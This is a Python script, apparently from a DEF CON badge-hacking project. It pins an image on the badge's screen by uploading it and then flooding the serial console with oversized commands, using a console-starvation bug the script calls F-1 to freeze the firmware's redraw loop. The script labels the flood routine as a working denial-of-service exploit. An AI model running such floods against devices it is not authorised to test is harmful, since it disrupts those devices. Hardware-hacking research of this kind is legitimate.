#!/usr/bin/env python3
"""
freeze_display.py -- pin arbitrary content on the badge's screen by killing the code that
would replace it. Defeats a hard-coded firmware behaviour using finding F-1.

THE FIRMWARE BEHAVIOUR BEING DEFEATED
-------------------------------------
A user bitmap never stays on screen. The vault alternates it with the DEF CON logo every
three seconds, and there is no setting for it (dc34-vault/src/ux.rs:782):

    if let Some(bitmap) = self.user_bitmap.as_ref() {
        let edge = (now / 3000) % 2 == 0;
        if self.edge != edge || mode_at_entry != self.last_mode {
            if self.phase {
                self.gfx.bitmap_diffusion(bitmap, None, None).ok();              // yours
            } else {
                self.gfx.bitmap_diffusion(&bitmaps::dc_logo::BITMAP, ...).ok();  // theirs
            }
            self.phase = !self.phase;
        }
    }

So uploading an image is not enough: it shows for three seconds, disappears for three,
forever. Holding the screen requires stopping the code that overwrites it.

WHAT THIS DOES
--------------
Two stages, and the split matters:

  stage 1  upload the image with the vendor's documented `image` command.
           NOT an exploit. This is only the content.

  stage 2  trigger F-1 while that image is the one being displayed. The vault stops
           servicing events, stops redrawing, and the panel keeps whatever was last
           painted -- your image, permanently, until power is removed.
           THIS is the exploit. Persistence is the part the firmware was built to deny.

F-1 (see ../../docs/F-1-console-starvation.md): injected keystrokes take a blocking IPC path into a
bounded queue while hardware button events take a dropping one, so flooding the console
starves every listener, the vault included.

WHY IT MAY TAKE MORE THAN ONE GO
--------------------------------
The alternation phase is not observable from outside -- it is driven by the badge's own
uptime. Firing blind is a coin flip: land in the wrong half and the screen freezes on the
DEF CON logo instead. `--attempts` retries, but each failure needs a power cycle, so the
tool stops and says so rather than pretending.

RECOVERY
    Remove power. No battery fitted: unplug USB for 3 s. Battery fitted: pull a cell.

USAGE
    python freeze_display.py --port COM5 --art cat
    python freeze_display.py --port COM5 --text "PWN by Meow"
"""

import argparse
import base64
import os
import sys
import time
import zlib

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "transport"))

W = H = 128
CHUNK_DELAY = 0.28


#: Upper bound on the nearest-neighbour scale factor for text.
#:
#: PIL's default bitmap font is about 11 px tall. Scaling it to fill a 128 px panel gives
#: a factor around 4, and at that size the glyph strokes merge into each other and the
#: result is unreadable -- which is exactly what the first pinned frame looked like.
#: Capping at 3 keeps the letterforms distinct.
MAX_TEXT_SCALE = 3.0


def render_text(text: str):
    """White-on-black, matching the badge's own screens."""
    from PIL import Image, ImageDraw
    lines = text.split("\n") if "\n" in text else text.split()
    img = Image.new("1", (W, H), 0)
    d = ImageDraw.Draw(img)
    d.rectangle([0, 0, W - 1, H - 1], outline=1, width=2)

    margin_x, margin_y = 10, 10
    slot = (H - 2 * margin_y) // max(1, len(lines))

    rendered = []
    for line in lines:
        tmp = Image.new("1", (W * 4, 28), 0)
        ImageDraw.Draw(tmp).text((2, 2), line, fill=1)
        box = tmp.getbbox()
        rendered.append(tmp.crop(box) if box else None)

    # One scale for every line, so the text does not jump size between rows.
    scale = MAX_TEXT_SCALE
    for crop in rendered:
        if crop:
            scale = min(scale,
                        (W - 2 * margin_x) / crop.width,
                        (slot - 4) / crop.height)
    scale = max(1.0, scale)

    total_h = sum(max(1, int(c.height * scale)) + 4 for c in rendered if c) - 4
    y = max(margin_y, (H - total_h) // 2)
    for crop in rendered:
        if not crop:
            continue
        nw, nh = max(1, int(crop.width * scale)), max(1, int(crop.height * scale))
        img.paste(crop.resize((nw, nh), Image.NEAREST), ((W - nw) // 2, y))
        y += nh + 4
    return img


def _caption(img, text, fill):
    from PIL import Image, ImageDraw
    if not text:
        return
    tmp = Image.new("1", (W * 4, 28), 0)
    ImageDraw.Draw(tmp).text((2, 2), text, fill=1)
    box = tmp.getbbox()
    if not box:
        return
    crop = tmp.crop(box)
    sc = min(3.0, (W - 24) / crop.width, 22 / crop.height)
    nw, nh = max(1, int(crop.width * sc)), max(1, int(crop.height * sc))
    if fill == 0:                       # dark caption on a light panel
        from PIL import ImageOps
        crop = ImageOps.invert(crop.convert("L")).convert("1")
    img.paste(crop.resize((nw, nh), Image.NEAREST), ((W - nw) // 2, H - nh - 8))


def art_cat(caption="MEOW"):
    """A cat face built from solid filled shapes.

    Two lessons are baked in here. First, PIL's default bitmap font disintegrates when
    scaled to fill a 128 px panel, which is why an ASCII cat (`^. . ^MEOW`) came out as
    a blob. Second -- and this is what the first geometric version got wrong -- the vault
    renders user bitmaps through `bitmap_diffusion` (ux.rs:785), an error-diffusion
    dither. Single-pixel outlines and 2 px whiskers get chewed up by it; large solid
    areas survive intact. So everything here is a filled mass, nothing is a thin line.
    """
    from PIL import Image, ImageDraw
    img = Image.new("1", (W, H), 0)
    d = ImageDraw.Draw(img)

    cx, cy = 64, 52
    # Ears first, so the head overlaps their bases.
    d.polygon([(cx - 38, cy - 6), (cx - 30, cy - 44), (cx - 6, cy - 20)], fill=1)
    d.polygon([(cx + 38, cy - 6), (cx + 30, cy - 44), (cx + 6, cy - 20)], fill=1)
    d.ellipse([cx - 38, cy - 26, cx + 38, cy + 32], fill=1)                  # head, solid

    # Features punched out in black -- holes in a solid mass read far better under
    # dithering than white strokes on black.
    for ex in (cx - 16, cx + 16):
        d.ellipse([ex - 8, cy - 12, ex + 8, cy + 6], fill=0)                 # eyes
    d.polygon([(cx - 7, cy + 8), (cx + 7, cy + 8), (cx, cy + 17)], fill=0)   # nose
    d.rectangle([cx - 20, cy + 20, cx + 20, cy + 25], fill=0)                # mouth line
    for dy in (-2, 8):                                                        # whisker slots
        d.rectangle([cx - 36, cy + 4 + dy, cx - 24, cy + 8 + dy], fill=0)
        d.rectangle([cx + 24, cy + 4 + dy, cx + 36, cy + 8 + dy], fill=0)

    _caption(img, caption, 1)
    return img


def art_skull(caption="PWNED"):
    from PIL import Image, ImageDraw
    img = Image.new("1", (W, H), 0)
    d = ImageDraw.Draw(img)
    d.rectangle([0, 0, W - 1, H - 1], outline=1, width=2)

    cx, cy = 64, 50
    d.ellipse([cx - 30, cy - 30, cx + 30, cy + 20], fill=1)                  # cranium
    d.rectangle([cx - 18, cy + 14, cx + 18, cy + 34], fill=1)                # jaw
    for ex in (cx - 14, cx + 14):                                            # eye sockets
        d.ellipse([ex - 9, cy - 14, ex + 9, cy + 4], fill=0)
    d.polygon([(cx, cy + 2), (cx - 6, cy + 12), (cx + 6, cy + 12)], fill=0)  # nose
    for tx in range(cx - 14, cx + 15, 9):                                    # teeth gaps
        d.line([(tx, cy + 20), (tx, cy + 32)], fill=0, width=2)

    tmp = Image.new("1", (W * 4, 28), 0)
    ImageDraw.Draw(tmp).text((2, 2), caption, fill=1)
    box = tmp.getbbox()
    if box:
        crop = tmp.crop(box)
        sc = min(3.0, (W - 24) / crop.width, 22 / crop.height)
        nw, nh = max(1, int(crop.width * sc)), max(1, int(crop.height * sc))
        img.paste(crop.resize((nw, nh), Image.NEAREST), ((W - nw) // 2, H - nh - 8))
    return img


ART = {"cat": art_cat, "skull": art_skull}


def pack_chunks(img):
    raw = img.convert("1").tobytes()
    assert len(raw) == 2048
    out = []
    for i in range(32):
        body = i.to_bytes(2, "big") + raw[i * 64:(i + 1) * 64]
        out.append(base64.b64encode(body + (zlib.crc32(body) & 0xFFFFFFFF)
                                    .to_bytes(4, "big")).decode())
    return out


def upload(ser, img, retries=4):
    """Stage 1 -- documented `image` command, with per-chunk acknowledgement."""
    ser.reset_input_buffer()
    ser.write(b"\r\n")
    ser.flush()
    time.sleep(0.3)
    ser.reset_input_buffer()

    chunks = pack_chunks(img)
    for i, c in enumerate(chunks):
        for _ in range(retries):
            ser.reset_input_buffer()
            ser.write(f"image {c}\r\n".encode())
            ser.flush()
            time.sleep(CHUNK_DELAY)
            buf, end = "", time.time() + 1.2
            while time.time() < end:
                buf += ser.read(512).decode("utf8", "replace")
                if "OK" in buf or "SUCCESS" in buf or "ERR" in buf:
                    break
            if "OK" in buf or "SUCCESS" in buf:
                break
            time.sleep(0.35)
        else:
            return False, i
    return True, 32


def flood(ser, count, size, gap):
    """Stage 2 -- F-1. Starve the vault so it stops redrawing."""
    sent = 0
    try:
        for _ in range(count):
            ser.write(b"image " + b"A" * size + b"\r\n")
            ser.flush()
            sent += 1
            time.sleep(gap)
    except Exception:
        pass
    return sent


def responsive(ser) -> bool:
    try:
        ser.reset_input_buffer()
        ser.write(b"\r\nver\r\n")
        ser.flush()
    except Exception:
        return False
    time.sleep(1.2)
    try:
        r = ser.read(16384).decode("utf8", "replace").lower()
    except Exception:
        return False
    return any(m in r for m in ("xous", "[console]", "commands:"))


def main() -> int:
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--port", default="COM5")
    ap.add_argument("--image", help="PNG to pin (128x128 preferred)")
    ap.add_argument("--text", default="PWN\nby\nMeow", help="text to render if no --image")
    ap.add_argument("--art", choices=sorted(ART),
                    help="draw built-in pixel art instead of text. Shapes stay legible "
                         "at 128x128; a scaled bitmap font does not")
    ap.add_argument("--caption", default=None, help="caption under the art")
    ap.add_argument("--invert", action="store_true",
                    help="flip black/white. The vault renders user bitmaps through an "
                         "error-diffusion dither (ux.rs:785) and the resulting polarity "
                         "is not always what the source image suggests -- if the panel "
                         "comes out reversed, add this")
    ap.add_argument("--burst", type=int, default=30)
    ap.add_argument("--size", type=int, default=1500)
    ap.add_argument("--gap", type=float, default=0.25)
    ap.add_argument("--delay", type=float, default=0.0,
                    help="seconds to wait after upload before flooding, to shift the "
                         "phase of the 3s alternation")
    a = ap.parse_args()

    try:
        import serial
        from PIL import Image
    except ImportError as e:
        print(f"missing dependency: {e}")
        return 1

    if a.art:
        img = ART[a.art](a.caption if a.caption is not None
                         else {"cat": "MEOW", "skull": "PWNED"}[a.art])
        what = f"art:{a.art}"
    elif a.image:
        img = Image.open(a.image).convert("1").resize((W, H))
        what = a.image
    else:
        img = render_text(a.text.replace("\\n", "\n"))
        what = repr(a.text)

    if a.invert:
        from PIL import ImageOps
        img = ImageOps.invert(img.convert("L")).convert("1")
        what += " (inverted)"

    print("stage 1: upload the content   (documented `image` command -- NOT an exploit)")
    print(f"         {what}")
    ser = serial.Serial(a.port, 115200, timeout=0.2, write_timeout=5.0)
    time.sleep(0.5)

    if not responsive(ser):
        print("\nThe badge is not answering -- it is frozen from a previous run.")
        print("Unplug USB for 3 s, plug it back in, and re-run.")
        ser.close()
        return 2

    t0 = time.time()
    ok, done = upload(ser, img)
    print(f"         {done}/32 chunks in {time.time() - t0:.1f}s  "
          f"{'ok' if ok else '-- FAILED, power-cycle and retry'}")
    if not ok:
        ser.close()
        return 1

    if a.delay:
        print(f"         waiting {a.delay}s to shift the alternation phase")
        time.sleep(a.delay)

    print()
    print("stage 2: freeze the vault      (finding F-1 -- THIS is the exploit)")
    print(f"         flooding {a.burst} x {a.size} chars to starve the redraw loop")
    sent = flood(ser, a.burst, a.size, a.gap)
    print(f"         sent {sent}")
    time.sleep(2.0)

    still = responsive(ser)
    ser.close()
    print(f"         console {'STILL ALIVE -- not frozen' if still else 'DEAD -- vault stopped'}")
    print()
    print("=" * 66)
    if still:
        print("The flood did not take. Raise --burst or --size and try again.")
        return 1

    print(">>> LOOK AT THE BADGE <<<")
    print()
    print("  Your image, held there        -> the 3-second alternation at ux.rs:783 has")
    print("                                   been defeated. The firmware cannot replace")
    print("                                   it because the code that would is dead.")
    print()
    print("  DEF CON logo, held there      -> the freeze landed in the wrong half of the")
    print("                                   alternation. Power-cycle and re-run with")
    print("                                   --delay 3 to flip the phase.")
    print()
    print("Recovery: unplug USB for 3 s (pull a cell if a battery is fitted).")
    return 0


if __name__ == "__main__":
    sys.exit(main())
